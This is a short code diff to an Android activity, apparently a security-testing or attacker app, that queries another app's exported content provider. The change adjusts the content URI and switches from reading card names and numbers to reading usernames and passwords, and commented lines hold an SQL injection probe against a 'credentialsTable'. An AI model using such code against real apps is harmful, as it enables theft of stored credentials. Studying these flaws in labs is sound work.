@@ -5,7 +5,6 @@ import android.content.Intent;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.Bundle;
-import android.os.health.ProcessHealthStats;
 import android.util.Log;
 import android.view.View;
 import android.widget.Button;
@@ -35,7 +34,8 @@ public class ExportedContent extends Activity {
         //CPReport report = cpm.map();
         //Log.v("CONTENT",report.toString());
         //ArrayList<String[]> rows = cpm.dump("* FROM credentialsTable WHERE 2=2 --.");
-        ContentURI= "content://"+ ContentURI + "/cards";
+        //ContentURI= "content://"+ ContentURI + "/cards";
+        ContentURI= "content://"+ ContentURI;
         //Log.v("SQL INJECTION",rows.toString());
         Log.v("CONTENT URIII",ContentURI.toString());
 
@@ -51,7 +51,7 @@ public class ExportedContent extends Activity {
                     if (cursor.moveToFirst()) {
                         StringBuilder strBuild = new StringBuilder();
                         while (!cursor.isAfterLast()) {
-                            strBuild.append("\n" + cursor.getString(cursor.getColumnIndex("_id")) + "-" + cursor.getString(cursor.getColumnIndex("name")) + "-" + cursor.getString(cursor.getColumnIndex("number")));
+                            strBuild.append("\n" + cursor.getString(cursor.getColumnIndex("id")) + "-" + cursor.getString(cursor.getColumnIndex("username")) + "-" + cursor.getString(cursor.getColumnIndex("password")));
                             cursor.moveToNext();
                         }
                         resultView.setText(strBuild);
